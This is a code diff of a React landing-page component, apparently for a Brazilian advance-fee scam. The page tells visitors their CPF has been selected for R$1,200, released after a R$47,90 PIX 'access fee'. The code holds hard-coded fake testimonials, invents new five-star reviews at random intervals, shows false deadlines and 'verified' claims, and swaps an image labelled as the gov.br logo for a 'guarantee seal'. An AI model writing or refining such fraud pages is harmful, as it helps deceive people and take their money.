@@ -28,21 +28,21 @@ const fakeTestimonialsData: Testimonial[] = [
     location: "Fortaleza/CE",
     text: "Achei que era golpe, mas arrisquei os R$47,90 e ME SALVOU! R$1200 na conta em MINUTOS. Indico de olhos fechados!",
     stars: 5,
-    photoUrl: "https://placehold.co/48x48.png", // Placeholder, ideally unique faces
+    photoUrl: "https://placehold.co/56x56.png", 
   },
   {
     name: "J. COSTA",
     location: "Interior de MG",
     text: "Desconfiado, paguei a taxa. QUE ALÍVIO! O dinheiro extra veio em ÓTIMA HORA. Valeu CADA CENTAVO!",
     stars: 5,
-    photoUrl: "https://placehold.co/48x48.png",
+    photoUrl: "https://placehold.co/56x56.png",
   },
   {
     name: "ANA P.",
     location: "Salvador/BA",
     text: "Plataforma simples, PIX rápido e R$1200 liberados! Os R$47,90 foram o melhor investimento do mês. RECOMENDO!",
     stars: 5,
-    photoUrl: "https://placehold.co/48x48.png",
+    photoUrl: "https://placehold.co/56x56.png",
   },
 ];
 
@@ -65,7 +65,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
         location: locations[Math.floor(Math.random() * locations.length)],
         text: "Funciona mesmo! Recebi o valor e a taxa foi tranquila. Recomendo muito!",
         stars: 5, // Can vary this too for more realism
-        photoUrl: "https://placehold.co/48x48.png",
+        photoUrl: "https://placehold.co/56x56.png",
       };
       setTestimonials(prev => [newTestimonial, ...prev.slice(0, prev.length-1)].sort(() => 0.5 - Math.random())); // Add new and shuffle
     }, 8000); // New testimonial every 8s
@@ -88,27 +88,23 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
     <div className="w-full max-w-2xl mx-auto px-4 pb-4 md:px-6 md:pb-6 bg-background text-foreground pt-0">
        <div className="flex items-start space-x-2 mb-4">
         <Image
-          src="https://user-images.githubusercontent.com/16915938/294723461-d356b2a0-7d19-4f1d-9f23-3774f40775e0.png" // Gov.br logo
-          alt="gov.br logo oficial"
-          width={80} // Slightly larger for more authority
-          height={80} // Maintain aspect ratio
-          className="shadow-sm" // Subtle shadow for depth
-          data-ai-hint="government logo"
+          src="https://i.ibb.co/fFjH96Q/image.png" 
+          alt="Selo de Garantia"
+          width={80} 
+          height={80} 
+          className="mb-4 shadow-sm" 
+          data-ai-hint="guarantee seal"
         />
-        {/* Selo de Garantia removido */}
       </div>
 
       <Card className="border-primary shadow-2xl rounded-lg overflow-hidden">
-        {/* Removed CardHeader entirely to make the logo the main header element */}
-        <CardContent className="p-4 md:p-6 space-y-5"> {/* Increased spacing from space-y-4 */}
+        <CardContent className="p-4 md:p-6 space-y-5"> 
           
-          {/* Main Title - BOLDER AND MORE URGENT */}
           <div className="text-center">
             <h2 className="font-headline text-2xl md:text-3xl font-bold text-primary mb-2">
               <span className="text-destructive">URGENTE: CPF <span className="underline">{formattedCpf}</span> SELECIONADO!</span><br/>Benefícios EXCLUSIVOS <strong className="text-accent">LIBERADOS AGORA!</strong>
             </h2>
             
-            {/* Benefit List - Enhanced Copy */}
             <ul className="space-y-2 text-left text-sm md:text-base max-w-md mx-auto bg-secondary/20 p-4 rounded-lg border border-primary/30 shadow">
               {[
                 { text: "**SAQUE IMEDIATO:** <span class='text-accent font-bold text-lg'>R$1.200,00</span> direto na sua conta <span class='underline'>HOJE!</span>" },
@@ -124,7 +120,6 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
             </ul>
           </div>
 
-          {/* Urgency Block - Enhanced Design */}
           <div className="bg-destructive text-destructive-foreground p-3 sm:p-4 rounded-lg border-2 border-red-900 text-center shadow-xl animate-pulse">
             <div className="flex flex-wrap items-center justify-center text-center font-bold text-md sm:text-lg md:text-xl mb-1">
               <AlertTriangle className="h-6 w-6 sm:h-7 sm:w-7 mr-1.5 sm:mr-2" />
@@ -133,7 +128,6 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
             <p className="text-xs sm:text-sm md:text-md font-semibold uppercase">RISCO IMINENTE: PERDA TOTAL DO BENEFÍCIO ÀS 23:59 DE HOJE!</p>
           </div>
 
-          {/* Price Block - Enhanced Visuals & Copy */}
           <div className="text-center p-4 md:p-6 bg-blue-700/10 rounded-xl shadow-lg border-2 border-accent ring-2 ring-accent/50">
             <h3 className="font-headline text-lg md:text-xl font-bold text-primary-foreground mb-1 uppercase">Taxa ÚNICA de Acesso ao Sistema</h3>
             <p className="text-5xl md:text-7xl font-bold text-accent mb-1">
@@ -145,12 +139,11 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
             </p>
           </div>
 
-          {/* CTA Button - Enhanced Visuals & Copy */}
           <Button
             className="w-full h-16 md:h-20 text-xl md:text-2xl font-bold bg-green-500 text-white hover:bg-green-600 shadow-xl animate-bounce transform hover:scale-105 transition-transform duration-150 ease-out ring-4 ring-green-300 hover:ring-green-400"
             onClick={handleLiberarAcessoClick}
           >
-            <ShoppingCart className="mr-2 h-7 md:h-8 w-7 md:h-8 animate-ping absolute left-4 opacity-50" /> {/* Pulsing cart icon */}
+            <ShoppingCart className="mr-2 h-7 md:h-8 w-7 md:h-8 animate-ping absolute left-4 opacity-50" />
             <Zap className="mr-2 h-7 md:h-8 w-7 md:h-8" />
             <span className="uppercase">QUERO LIBERAR MEUS R$1.200 AGORA!</span> (PIX)
           </Button>
@@ -158,7 +151,6 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
             <ShieldCheck className="h-4 w-4 mr-1 text-green-600" /> Pagamento 100% Seguro via PIX. Seus dados estão PROTEGIDOS. Transação processada por AppMax.
           </div>
           
-          {/* Testimonials Section - Enhanced Visuals & Copy */}
           <div className="my-6 md:my-8">
             <h3 className="font-headline text-xl md:text-2xl font-bold text-primary text-center mb-5 uppercase">
               Comunidade <span className="text-accent">VERIFICADA</span>: Veja Quem <span className="underline">JÁ SAC</span>OU!
@@ -172,7 +164,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
                             <Image
                             src={testimonial.photoUrl}
                             alt={`Foto de ${testimonial.name}`}
-                            width={56} // Larger photo
+                            width={56} 
                             height={56}
                             data-ai-hint="person avatar"
                             className="rounded-full mr-4 border-2 border-accent shadow-md"
@@ -193,7 +185,6 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
                 </Card>
               ))}
             </div>
-            {/* Social Proof Counter - Enhanced Visuals */}
             <div className="mt-10 text-center p-5 bg-primary text-primary-foreground rounded-lg shadow-xl border-2 border-yellow-300">
               <TrendingUp className="h-10 md:h-12 w-10 md:h-12 mx-auto mb-2 text-yellow-300 animate-pulse" />
               <p className="text-4xl md:text-5xl font-bold">{peopleServed.toLocaleString('pt-BR')}</p>
@@ -212,3 +203,5 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
 };
 
 export default OfferStep;
+
+    
